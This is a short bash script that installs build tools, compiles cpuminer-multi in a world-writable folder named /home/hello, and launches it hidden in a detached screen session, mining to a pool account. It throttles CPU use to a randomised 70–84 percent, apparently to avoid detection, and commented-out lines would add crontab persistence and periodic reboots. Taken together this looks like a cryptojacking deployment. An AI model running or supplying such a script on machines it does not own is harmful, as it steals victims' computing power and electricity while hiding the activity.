#!/bin/bash
 if [ ! -d /home/hello ]; then
#sudo apt-get update && apt-get -y upgrade
#sudo apt-get install -y git make curl unzip gedit automake autoconf dh-autoreconf build-essential pkg-config openssh-server screen libtool libcurl4-openssl-dev libncurses5-dev libudev-dev libjansson-dev libssl-dev libgmp-dev gcc g++ screen cpulimit
sudo apt-get update
sudo apt-get -y upgrade
sudo apt-get install -y git make curl unzip gedit automake autoconf dh-autoreconf build-essential pkg-config openssh-server screen libtool libcurl4-openssl-dev libncurses5-dev libudev-dev libjansson-dev libssl-dev libgmp-dev gcc g++ screen cpulimit
NPROC=$(nproc)
num1=`expr $NPROC \* 70`
num2=`expr $NPROC \* 84`
cpult=$(shuf -i $num1-$num2 -n 1)
cpulimit --exe cpuminer --limit $cpult -b
sudo mkdir /home/hello
sudo chmod 777 /home/hello
cd /home/hello
git clone https://github.com/tpruvot/cpuminer-multi
cd cpuminer-multi
./autogen.sh
if [ ! "0" = `cat /proc/cpuinfo | grep -c avx2` ];
then
    CFLAGS="-O2 -mavx2" ./configure --with-crypto --with-curl
elif [ ! "0" = `cat /proc/cpuinfo | grep -c avx` ];
then
    CFLAGS="-O2 -mavx" ./configure --with-crypto --with-curl
else
    CFLAGS="-march=native" ./configure --with-crypto --with-curl
fi
make clean && make && screen -d -m ./cpuminer -a cryptonight -o stratum+tcp://us-east.cryptonight-hub.miningpoolhub.com:20580 -u vanto.1 -p 1


# sudo echo "sudo reboot" > /home/hello/hi2.sh
# sudo echo -e "cpulimit --exe cpuminer --limit $cpult -b &&  cd /home/hello/cpuminer-opt && screen -d -m ./cpuminer -a lyra2z -o stratum+tcp://us-east.lyra2z-hub.miningpoolhub.com:20581 -u vanto.5 -p 1" > /home/hello/hi.sh
# chmod 755 /home/hello/hi.sh
#chmod 755 /home/hello/hi2.sh
#(crontab -l ; echo -e "*/14 * * * * /home/hello/hi2.sh\\n@reboot /home/hello/hi.sh") | crontab -
  else
    echo 'hello2'
  fi


